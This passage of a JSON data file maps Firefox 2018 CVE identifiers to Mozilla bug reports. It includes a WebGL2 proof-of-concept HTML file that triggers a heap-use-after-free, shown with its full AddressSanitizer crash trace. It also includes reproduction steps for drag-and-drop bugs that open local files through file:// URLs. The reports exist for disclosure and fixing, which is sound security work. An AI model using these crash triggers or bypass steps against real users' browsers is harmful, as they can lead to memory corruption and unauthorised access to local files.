        "title": "heap-use-after-free in mozilla::WebGLContext::DrawElementsInstanced",
        "description": "The following testcase crashes the latest ASAN build of Firefox 60.0a1 (SourceStamp=a6a32fb286fa9e5d5f6d5b3b77423ab6b96c9502). crash.html: <script> o935=document.createElementNS('http://www.w3.org/1999/xhtml','canvas'); o935.getContext('webgl2',{depth: true,stencil: true,antialias: true,premultipliedAlpha: false,preserveDrawingBuffer: true,failIfMajorPerformanceCaveat: false,}); o935.setAttribute('height','3'); o2819=o935.getContext('webgl2',{stencil: false,preserveDrawingBuffer: true,failIfMajorPerformanceCaveat: true,}); o3250=o2819.createBuffer(); o2819.bindBuffer(o2819.PIXEL_UNPACK_BUFFER,o3250); o3623=o2819.createTexture(); o2819.bindTexture(o2819.TEXTURE_2D,o3623); o2819.copyTexImage2D(o2819.TEXTURE_2D,2,o2819.RGBA,1,4,8,7,0); o935.setAttribute('height','9'); o2819.drawElements(o2819.LINE_STRIP,0,o2819.UNSIGNED_BYTE,10); </script> ASAN output: ================================================================= ==21389==ERROR: AddressSanitizer: heap-use-after-free on address 0x61e0000504a9 at pc 0x7fc1d0dec464 bp 0x7fff6f759b50 sp 0x7fff6f759b48 WRITE of size 1 at 0x61e0000504a9 thread T0 (file:// Content) #0 0x7fc1d0dec463 in ~TlsScope /builds/worker/workspace/build/src/gfx/gl/GLContext.h:216:35 #1 0x7fc1d0dec463 in mozilla::WebGLContext::DrawElementsInstanced(unsigned int, int, unsigned int, long, int, char const*) /builds/worker/workspace/build/src/dom/canvas/WebGLContextDraw.cpp:721 #2 0x7fc1cfccc036 in DrawElements /builds/worker/workspace/build/src/dom/canvas/WebGLContext.h:1329:9 #3 0x7fc1cfccc036 in mozilla::dom::WebGL2RenderingContextBinding::drawElements(JSContext*, JS::Handle<JSObject*>, mozilla::WebGL2Context*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WebGL2RenderingContextBinding.cpp:10939 #4 0x7fc1d0bf92b1 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3031:13 #5 0x7fc1d76e46c8 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15 #6 0x7fc1d76e46c8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #7 0x7fc1d76ca2f9 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #8 0x7fc1d76ca2f9 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3085 #9 0x7fc1d76b638a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #10 0x7fc1d76e76c4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:700:15 #11 0x7fc1d76e7e4f in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:732:12 #12 0x7fc1d81d7129 in ExecuteScript(JSContext*, JS::AutoVector<JSObject*>&, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/jsapi.cpp:4748:12 #13 0x7fc1ce4b6836 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:266:8 #14 0x7fc1d2d14a74 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2321:25 #15 0x7fc1d2d0e4b9 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1950:10 #16 0x7fc1d2d0b8e7 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1591:10 #17 0x7fc1d2ceea7e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1310:10 #18 0x7fc1d2cedb99 in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:141:18 #19 0x7fc1cd26a87b in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:247:18 #20 0x7fc1cd26a87b in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:736 #21 0x7fc1cd263d74 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:540:7 #22 0x7fc1cd26fc6b in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:131:20 #23 0x7fc1cb2fd320 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:413:25 #24 0x7fc1cb326ae6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #25 0x7fc1cb342080 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #26 0x7fc1cc1f552a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #27 0x7fc1cc147389 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #28 0x7fc1cc147389 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #29 0x7fc1cc147389 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #30 0x7fc1d2f5811a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #31 0x7fc1d7415bfb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:892:22 #32 0x7fc1cc147389 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #33 0x7fc1cc147389 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #34 0x7fc1cc147389 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #35 0x7fc1d74155da in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:718:34 #36 0x4f1875 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:50:30 #37 0x4f1875 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #38 0x7fc1ea9c182f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f) #39 0x420f48 in _start (/fuzzer3/firefox/firefox+0x420f48) 0x61e0000504a9 is located 41 bytes inside of 2744-byte region [0x61e000050480,0x61e000050f38) freed by thread T0 (file:// Content) here: #0 0x4c1952 in __interceptor_free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:68:3 #1 0x7fc1d0dcf5f9 in ForceLoseContext /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:1883:5 #2 0x7fc1d0dcf5f9 in mozilla::WebGLContext::EnsureDefaultFB(char const*) /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:785 #3 0x7fc1d0daed2e in ValidateAndInitFB /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:1983:10 #4 0x7fc1d0daed2e in mozilla::WebGLContext::BindCurFBForDraw(char const*) /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:2009 #5 0x7fc1d0de939b in mozilla::ScopedDrawHelper::ScopedDrawHelper(mozilla::WebGLContext*, char const*, unsigned int, mozilla::Maybe<unsigned int> const&, unsigned int, bool*) /builds/worker/workspace/build/src/dom/canvas/WebGLContextDraw.cpp:246:22 #6 0x7fc1d0deb960 in mozilla::WebGLContext::DrawElementsInstanced(unsigned int, int, unsigned int, long, int, char const*) /builds/worker/workspace/build/src/dom/canvas/WebGLContextDraw.cpp:683:28 #7 0x7fc1cfccc036 in DrawElements /builds/worker/workspace/build/src/dom/canvas/WebGLContext.h:1329:9 #8 0x7fc1cfccc036 in mozilla::dom::WebGL2RenderingContextBinding::drawElements(JSContext*, JS::Handle<JSObject*>, mozilla::WebGL2Context*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/WebGL2RenderingContextBinding.cpp:10939 #9 0x7fc1d0bf92b1 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3031:13 #10 0x7fc1d76e46c8 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15 #11 0x7fc1d76e46c8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #12 0x7fc1d76ca2f9 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #13 0x7fc1d76ca2f9 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3085 #14 0x7fc1d76b638a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #15 0x7fc1d76e76c4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:700:15 #16 0x7fc1d76e7e4f in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:732:12 #17 0x7fc1d81d7129 in ExecuteScript(JSContext*, JS::AutoVector<JSObject*>&, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/jsapi.cpp:4748:12 #18 0x7fc1ce4b6836 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:266:8 #19 0x7fc1d2d14a74 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2321:25 #20 0x7fc1d2d0e4b9 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1950:10 #21 0x7fc1d2d0b8e7 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1591:10 #22 0x7fc1d2ceea7e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1310:10 #23 0x7fc1d2cedb99 in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:141:18 #24 0x7fc1cd26a87b in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:247:18 #25 0x7fc1cd26a87b in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:736 #26 0x7fc1cd263d74 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:540:7 #27 0x7fc1cd26fc6b in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:131:20 #28 0x7fc1cb2fd320 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:413:25 #29 0x7fc1cb326ae6 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1040:14 #30 0x7fc1cb342080 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:517:10 #31 0x7fc1cc1f552a in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #32 0x7fc1cc147389 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #33 0x7fc1cc147389 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #34 0x7fc1cc147389 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #35 0x7fc1d2f5811a in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #36 0x7fc1d7415bfb in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:892:22 #37 0x7fc1cc147389 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #38 0x7fc1cc147389 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #39 0x7fc1cc147389 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 previously allocated by thread T0 (file:// Content) here: #0 0x4c1c93 in malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:88:3 #1 0x4f26fd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:70:17 #2 0x7fc1cd4e0ca0 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:156:12 #3 0x7fc1cd4e0ca0 in mozilla::gl::GLContextGLX::CreateGLContext(mozilla::gl::CreateContextFlags, mozilla::gl::SurfaceCaps const&, bool, _XDisplay*, unsigned long, __GLXFBConfigRec*, bool, gfxXlibSurface*) /builds/worker/workspace/build/src/gfx/gl/GLContextProviderGLX.cpp:546 #4 0x7fc1cd4e3732 in mozilla::gl::CreateOffscreenPixmapContext(mozilla::gl::CreateContextFlags, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gl::SurfaceCaps const&, nsTSubstring<char>*) /builds/worker/workspace/build/src/gfx/gl/GLContextProviderGLX.cpp:1007:12 #5 0x7fc1cd4e3abd in mozilla::gl::GLContextProviderGLX::CreateOffscreen(mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gl::SurfaceCaps const&, mozilla::gl::CreateContextFlags, nsTSubstring<char>*) /builds/worker/workspace/build/src/gfx/gl/GLContextProviderGLX.cpp:1034:10 #6 0x7fc1d0dce6d5 in mozilla::CreateGLWithDefault(mozilla::gl::SurfaceCaps const&, mozilla::gl::CreateContextFlags, mozilla::WebGLContext*, std::vector<mozilla::WebGLContext::FailureReason, std::allocator<mozilla::WebGLContext::FailureReason> >*) /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:565:28 #7 0x7fc1d0dcac7f in mozilla::WebGLContext::CreateAndInitGLWith(already_AddRefed<mozilla::gl::GLContext> (*)(mozilla::gl::SurfaceCaps const&, mozilla::gl::CreateContextFlags, mozilla::WebGLContext*, std::vector<mozilla::WebGLContext::FailureReason, std::allocator<mozilla::WebGLContext::FailureReason> >*), mozilla::gl::SurfaceCaps const&, mozilla::gl::CreateContextFlags, std::vector<mozilla::WebGLContext::FailureReason, std::allocator<mozilla::WebGLContext::FailureReason> >*) /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:597:23 #8 0x7fc1d0dcced4 in mozilla::WebGLContext::CreateAndInitGL(bool, std::vector<mozilla::WebGLContext::FailureReason, std::allocator<mozilla::WebGLContext::FailureReason> >*) /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:724:13 #9 0x7fc1d0dd0d32 in mozilla::WebGLContext::SetDimensions(int, int) /builds/worker/workspace/build/src/dom/canvas/WebGLContext.cpp:961:10 #10 0x7fc1d0d1aa0e in mozilla::dom::CanvasRenderingContextHelper::UpdateContext(JSContext*, JS::Handle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContextHelper.cpp:243:24 #11 0x7fc1d0d1a4ba in mozilla::dom::CanvasRenderingContextHelper::GetContext(JSContext*, nsTSubstring<char16_t> const&, JS::Handle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContextHelper.cpp:197:19 #12 0x7fc1d15241d0 in mozilla::dom::HTMLCanvasElement::GetContext(JSContext*, nsTSubstring<char16_t> const&, JS::Handle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/HTMLCanvasElement.cpp:1016:40 #13 0x7fc1d0646a50 in mozilla::dom::HTMLCanvasElementBinding::getContext(JSContext*, JS::Handle<JSObject*>, mozilla::dom::HTMLCanvasElement*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLCanvasElementBinding.cpp:275:49 #14 0x7fc1d0bf92b1 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3031:13 #15 0x7fc1d76e46c8 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/JSContext-inl.h:290:15 #16 0x7fc1d76e46c8 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:467 #17 0x7fc1d76ca2f9 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:12 #18 0x7fc1d76ca2f9 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3085 #19 0x7fc1d76b638a in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:417:12 #20 0x7fc1d76e76c4 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:700:15 #21 0x7fc1d76e7e4f in js::Execute(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:732:12 #22 0x7fc1d81d7129 in ExecuteScript(JSContext*, JS::AutoVector<JSObject*>&, JS::Handle<JSScript*>, JS::Value*) /builds/worker/workspace/build/src/js/src/jsapi.cpp:4748:12 #23 0x7fc1ce4b6836 in nsJSUtils::ExecutionContext::CompileAndExec(JS::CompileOptions&, JS::SourceBufferHolder&, JS::MutableHandle<JSScript*>) /builds/worker/workspace/build/src/dom/base/nsJSUtils.cpp:266:8 #24 0x7fc1d2d14a74 in mozilla::dom::ScriptLoader::EvaluateScript(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:2321:25 #25 0x7fc1d2d0e4b9 in mozilla::dom::ScriptLoader::ProcessRequest(mozilla::dom::ScriptLoadRequest*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1950:10 #26 0x7fc1d2d0b8e7 in mozilla::dom::ScriptLoader::ProcessInlineScript(nsIScriptElement*, mozilla::dom::ScriptKind) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1591:10 #27 0x7fc1d2ceea7e in mozilla::dom::ScriptLoader::ProcessScriptElement(nsIScriptElement*) /builds/worker/workspace/build/src/dom/script/ScriptLoader.cpp:1310:10 #28 0x7fc1d2cedb99 in mozilla::dom::ScriptElement::MaybeProcessScript() /builds/worker/workspace/build/src/dom/script/ScriptElement.cpp:141:18 #29 0x7fc1cd26a87b in AttemptToExecute /builds/worker/workspace/build/src/obj-firefox/dist/include/nsIScriptElement.h:247:18 #30 0x7fc1cd26a87b in nsHtml5TreeOpExecutor::RunScript(nsIContent*) /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:736 #31 0x7fc1cd263d74 in nsHtml5TreeOpExecutor::RunFlushLoop() /builds/worker/workspace/build/src/parser/html/nsHtml5TreeOpExecutor.cpp:540:7 #32 0x7fc1cd26fc6b in nsHtml5ExecutorFlusher::Run() /builds/worker/workspace/build/src/parser/html/nsHtml5StreamParser.cpp:131:20 #33 0x7fc1cb2fd320 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:413:25 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/gfx/gl/GLContext.h:216:35 in ~TlsScope Shadow bytes around the buggy address: 0x0c3c80002040: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3c80002050: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3c80002060: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c3c80002070: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c3c80002080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c3c80002090: fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd 0x0c3c800020a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3c800020b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3c800020c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3c800020d0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c3c800020e0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==21389==ABORTING"
      }
    ],
    "CVE-2018-5181": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1424107",
        "title": "Drag and dropping file: URL into new tab with rel=noopener allows opening locally stored files",
        "description": "User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 Steps to reproduce: Tested latest nightly. Open attached PoC and follow steps. Actual results: We can drag and drop a file url link into a rel=noopener tab and we will end up loading local files. Video(unlisted): https://www.youtube.com/watch?v=W2KHyfS6_7I Expected results: Similar to Bug 1379842, this should not be allowed. An argument could be made that this is intentional because you can drag and drop anchor tags from other browsers into a mozilla tab and it will open. Or drag and drop a file bookmark works. But I think its best not to allow links coming from normal web content to do this, one suggestion is to somehow detect dragged objects that contain file:// url that the window/document its dragged from has no access to and change this dragged objects values from the file:// url to about:blank. According to logs, the following error occurs: Security Error: Content at http://localhost/qw.html may not load or link to ... I think whatever function throws this error could also change the url dragged as well as i suggested above."
      }
    ],
    "CVE-2018-5182": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1435908",
        "title": "Web content can open local files and local folders using drag & drop event",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:58.0) Gecko/20100101 Firefox/58.0 Build ID: 20180128191252 Steps to reproduce: -1: Open the Test case in Attachments with Firefox. -2: Try to Drag and drop the link https://www.bankofamerica.com/ into the Addressbar or Tab bar. Actual results: Firefox loads the local folder: File:///etc/ . (I will upload a demonstration video) Expected results: The testcase works on Firefox 58.0.1 and also on Firefox Beta 59.0b6."
      }
    ],
    "CVE-2018-5183": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1454692",
        "title": "Backport relevant post-m55 Skia security fixes to ESR52",
        "description": "Per discussion with Milan and Dan today, we want to cherry-pick the relevant Skia security fixes which have landed upstream since the m55 release we're shipping in ESR52 rather than trying to do a wholesale uplift of m66. Dan is going to work on compiling a spreadsheet of the fixes in question."
      }
    ],
    "CVE-2018-5186": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1464872%2C1463329%2C1419373%2C1412882%2C1413033%2C1444673%2C1454448%2C1453505%2C1438671",
        "description": "Per discussion with Milan and Dan today, we want to cherry-pick the relevant Skia security fixes which have landed upstream since the m55 release we're shipping in ESR52 rather than trying to do a wholesale uplift of m66. Dan is going to work on compiling a spreadsheet of the fixes in question."
      }
    ],
    "CVE-2018-5187": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1461324%2C1414829%2C1395246%2C1467938%2C1461619%2C1425930%2C1438556%2C1454285%2C1459568%2C1463884",
        "description": "Per discussion with Milan and Dan today, we want to cherry-pick the relevant Skia security fixes which have landed upstream since the m55 release we're shipping in ESR52 rather than trying to do a wholesale uplift of m66. Dan is going to work on compiling a spreadsheet of the fixes in question."
      }
    ],
    "CVE-2018-5188": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1456189%2C1456975%2C1465898%2C1392739%2C1451297%2C1464063%2C1437842%2C1442722%2C1452576%2C1450688%2C1458264%2C1458270%2C1465108%2C1464829%2C1464079%2C1463494%2C1458048",
        "description": "Per discussion with Milan and Dan today, we want to cherry-pick the relevant Skia security fixes which have landed upstream since the m55 release we're shipping in ESR52 rather than trying to do a wholesale uplift of m66. Dan is going to work on compiling a spreadsheet of the fixes in question."
      }
    ]
  }
}